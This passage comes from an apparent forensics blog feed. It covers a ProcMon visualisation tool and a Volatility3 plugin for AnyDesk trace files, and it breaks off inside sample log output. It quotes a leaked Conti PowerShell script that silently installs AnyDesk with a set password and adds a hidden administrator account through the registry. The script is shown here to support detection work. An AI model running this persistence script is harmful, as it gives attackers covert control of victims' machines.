<p>Finally, the script ends by executing the malicious DLL through the rundll32.exe process. We can pivot on the process and witness the command line associated to the execution.</p>
<p><img decoding="async" loading="lazy" alt="alt text" src="https://forensicxlab.github.io/assets/images/4-3f31888c683f51ce61f7867a5d26f9ec.png" title="Vision filtered" width="1381" height="847" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="https://forensicxlab.github.io/blog/vision#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion">‚Äã</a></h2>
<p>VISION-ProcMon is a tool to help the malware analyst in his investigation. This means that it must be used in conjunction with other malware analysis tools (static, dynamic, ‚Ä¶). It is also a great way to complete your malware analysis reports by illustrating your explanations with visual examples. You can find the tool here : <a href="https://github.com/forensicxlab/VISION-ProcMon" target="_blank" rel="noopener noreferrer">https://github.com/forensicxlab/VISION-ProcMon</a></p>
<p>Do not hesitate to reach me at <a href="mailto:felix.guyard@forensicxlab.com" target="_blank" rel="noopener noreferrer">felix.guyard@forensicxlab.com</a> to enhance this tool or this article!</p>]]></content:encoded>
            <category>Malware Analysis</category>
            <category>Windows</category>
            <category>Procmon</category>
            <category>Qbot</category>
        </item>
        <item>
            <title><![CDATA[üì¶ Volatility3 Windows Plugin - AnyDesk]]></title>
            <link>https://forensicxlab.github.io/blog/anydesk</link>
            <guid>https://forensicxlab.github.io/blog/anydesk</guid>
            <pubDate>Fri, 30 Sep 2022 00:00:00 GMT</pubDate>
            <description><![CDATA[When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel.]]></description>
            <content:encoded><![CDATA[<p>When performing incident response, the adversary often uses legitimate remote access software as an interactive command and control channel.
AnyDesk<sup><a href="https://forensicxlab.github.io/blog/anydesk#user-content-fn-1-026302" id="user-content-fnref-1-026302" data-footnote-ref="true" aria-describedby="footnote-label">1</a></sup> is one of those software being extensively used as a sublayer of persistence by threat actors or access other servers in the environment via RDP<sup><a href="https://forensicxlab.github.io/blog/anydesk#user-content-fn-2-026302" id="user-content-fnref-2-026302" data-footnote-ref="true" aria-describedby="footnote-label">2</a></sup>.
The latter has been often encountered in the wild in the past years as a preferred tool leveraged by known threat actors.</p>
<p>As such, Anydesk should be closely monitored as threat actors could easily alter or delete data after a successful attack; sometimes it is not possible to restore those altered logs. Defending against malicious actions with such remote software can be even more intricate for organizations having approved its legitimate usage.
Here we propose to leverage memory forensics to retrieve and analyze artefacts thanks to a custom Volatility plugin that I made available as a free open-source tool for improving digital investigations.</p>
<p><em><strong>Conti AnyDesk installation tutorial</strong></em></p>
<p>A striking example came out the last year upon leaked manuals of Conti‚Äôs ransomware-as-a-service operators dedicated to its affiliates with pentesting skills<sup><a href="https://forensicxlab.github.io/blog/anydesk#user-content-fn-3-026302" id="user-content-fnref-3-026302" data-footnote-ref="true" aria-describedby="footnote-label">3</a></sup>.  From this case we can learn how the tool was installed by the attacker using PowerShell.</p>
<div class="language-PowerShell language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">–ó–∞–∫—Ä–µ–ø AnyDesk  </span><span class="token operator">-</span><span class="token plain"> –æ–∑–Ω–∞–∫–æ–º–∏—Ç—å—Å—è –≤—Å–µ–º</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">Function</span><span class="token plain"> AnyDesk </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    mkdir </span><span class="token string" style="color:rgb(255, 121, 198)">"C:\ProgramData\AnyDesk"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token comment" style="color:rgb(98, 114, 164)"># Download AnyDesk</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$clnt</span><span class="token plain"> = </span><span class="token function" style="color:rgb(80, 250, 123)">new-object</span><span class="token plain"> System</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">Net</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">WebClient</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$url</span><span class="token plain"> = </span><span class="token string" style="color:rgb(255, 121, 198)">"http://download.anydesk.com/AnyDesk.exe"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$file</span><span class="token plain"> = </span><span class="token string" style="color:rgb(255, 121, 198)">"C:\ProgramData\AnyDesk.exe"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$clnt</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">DownloadFile</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$url</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$file</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">/</span><span class="token plain">c C:\ProgramData\AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">--</span><span class="token plain">install C:\ProgramData\AnyDesk </span><span class="token operator">--</span><span class="token function" style="color:rgb(80, 250, 123)">start-with</span><span class="token operator">-</span><span class="token plain">win </span><span class="token operator">--</span><span class="token plain">silent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">/</span><span class="token plain">c </span><span class="token function" style="color:rgb(80, 250, 123)">echo</span><span class="token plain"> J9kzQ2Y0qO </span><span class="token punctuation" style="color:rgb(248, 248, 242)">|</span><span class="token plain"> C:\ProgramData\anydesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">--</span><span class="token function" style="color:rgb(80, 250, 123)">set-password</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    net user oldadministrator </span><span class="token string" style="color:rgb(255, 121, 198)">"qc69t4B#Z0kE3"</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain">add</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    net localgroup Administrators oldadministrator </span><span class="token operator">/</span><span class="token plain">ADD</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    reg add </span><span class="token string" style="color:rgb(255, 121, 198)">"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist"</span><span class="token plain"> </span><span class="token operator">/</span><span class="token plain">v oldadministrator </span><span class="token operator">/</span><span class="token plain">t REG_DWORD </span><span class="token operator">/</span><span class="token plain">d 0 </span><span class="token operator">/</span><span class="token plain">f</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    cmd</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">/</span><span class="token plain">c C:\ProgramData\AnyDesk</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">exe </span><span class="token operator">--</span><span class="token function" style="color:rgb(80, 250, 123)">get-id</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    AnyDesk</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>In this blog post, we will cover which files linked to anydesk are useful and how valuable it can be upon an investigation. Eventually, in the case where an intrusion set is deleting those files using an anti-forensics technique, a volatility3 plugin will be proposed to retrieve that information, which might still reside in memory.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="anydesk-trace-files">AnyDesk trace files<a href="https://forensicxlab.github.io/blog/anydesk#anydesk-trace-files" class="hash-link" aria-label="Direct link to AnyDesk trace files" title="Direct link to AnyDesk trace files">‚Äã</a></h2>
<p>When using Anydesk, specific files<sup><a href="https://forensicxlab.github.io/blog/anydesk#user-content-fn-4-026302" id="user-content-fnref-4-026302" data-footnote-ref="true" aria-describedby="footnote-label">4</a></sup> are written to trace the activity of the application. There are two files of particular interest:</p>
<ul>
<li>ad.trace</li>
<li>ad_svc.trace (only at installed version)</li>
</ul>
<p>On a windows 10 machine, you can respectively find those files in the <code>%APPDATA%\AnyDesk\</code> and <code>%SYSTEMROOT%\ProgramData\AnyDesk\</code>.
Here is an example of data you could find within the log file:</p>
<p><em><strong>ad.trace content example</strong></em></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.920       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                   app.backend_session - Starting session </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">deskrt, clipboard, chat, audio, input, tcp_tunnel</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.920       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                       desk_rt.encoder - </span><span class="token number">2</span><span class="token plain"> segments.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.923       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                     base.monitor_info - Monitors found: </span><span class="token number">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.923       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                   app.backend_session - Suspending session start </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">until</span><span class="token plain"> further notice.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.925       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                   app.backend_session - Continueing session start.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.925       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">             desk_rt.capture_component - Starting capture.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.925       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">3892</span><span class="token plain">            capture.dda_stream_capture - Initializing D3D.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.926       ctrl   </span><span class="token number">6572</span><span class="token plain">   </span><span class="token number">1320</span><span class="token plain">                        ad_app.control - Session count: </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">1</span><span class="token plain">, </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.927       ctrl   </span><span class="token number">6572</span><span class="token plain">   </span><span class="token number">1320</span><span class="token plain">                       clipbrd.capture - Registered </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">for</span><span class="token plain"> clipboard notifications.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.927       ctrl   </span><span class="token number">6572</span><span class="token plain">   </span><span class="token number">1320</span><span class="token plain">                    app.ctrl_clip_comp - Ready.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.927       ctrl   </span><span class="token number">6572</span><span class="token plain">   </span><span class="token number">1320</span><span class="token plain">                     win_app.wallpaper - Starting wallpaper.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.948       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">             desk_rt.capture_component - Sending </span><span class="token function" style="color:rgb(80, 250, 123)">screen</span><span class="token plain"> privacy status: off </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">no change</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.948       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">5476</span><span class="token plain">                        app.mouse_sink - Starting mouse sink.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.950       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">4136</span><span class="token plain">             desk_rt.capture_component - Keyboard layout changed to: unknown</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:53.950       back   </span><span class="token number">3240</span><span class="token plain">   </span><span class="token number">4136</span><span class="token plain">             desk_rt.capture_component - Focused monitor changed: </span><span class="token number">0</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">\</span><span class="token plain">DISPLAY1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><em><strong>ad_svc.trace content example</strong></em></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                      app.service - New IPC connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">13</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                      app.service - Creating an IPC accept socket.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                      app.service - Connected to </span><span class="token number">6572</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">control:1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                      app.service - Process login detected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                      app.service - Using existing control </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">6572</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:44.538       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">14</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">13</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.601       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                      app.service - Process start: </span><span class="token number">3524</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">frontend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.601       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">           anynet.relay_connector - Short timeouts enabled.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.742       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                      app.service - New IPC connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.742       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">1</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">15</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">1</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.742       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                      app.service - Creating an IPC accept socket.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:48.742       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                      app.service - Connected to </span><span class="token number">3524</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">frontend</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:49.139       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                      app.service - Process login detected.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:49.139       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">16</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">15</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:50.477       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                            gcpsa - Downloading gcapi.dll.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> error </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:50.518       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                 win_app.dir_file - Could not </span><span class="token function" style="color:rgb(80, 250, 123)">open</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">file</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token number">2</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:50.518       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">17</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">15</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:50.918       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">                       fiber.scheduler - Fiber </span><span class="token number">17</span><span class="token plain"> terminated.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:51.175       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">13</span><span class="token plain">                  fiber.scheduler - Spawning child fiber </span><span class="token number">18</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">parent </span><span class="token number">13</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:51.586       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">15</span><span class="token plain">           anynet.main_relay_conn - Reporting system information.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:30:52.221       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">                       fiber.scheduler - Fiber </span><span class="token number">18</span><span class="token plain"> terminated.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.131       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">    </span><span class="token number">4</span><span class="token plain">                  fiber.scheduler - Spawning root fiber </span><span class="token number">19</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.131       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">            anynet.connection_mgr - </span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token number">192.168</span><span class="token plain">.164.130:49152</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Incoming connection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.147       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token plain">   </span><span class="token number">19</span><span class="token plain">                  fiber.scheduler - Spawning root fiber </span><span class="token number">20</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  info </span><span class="token number">2022</span><span class="token plain">-09-27 </span><span class="token number">15</span><span class="token plain">:31:31.272       gsvc   </span><span class="token number">9068</span><span class="token plain">   </span><span class="token number">5920</span><span class="token 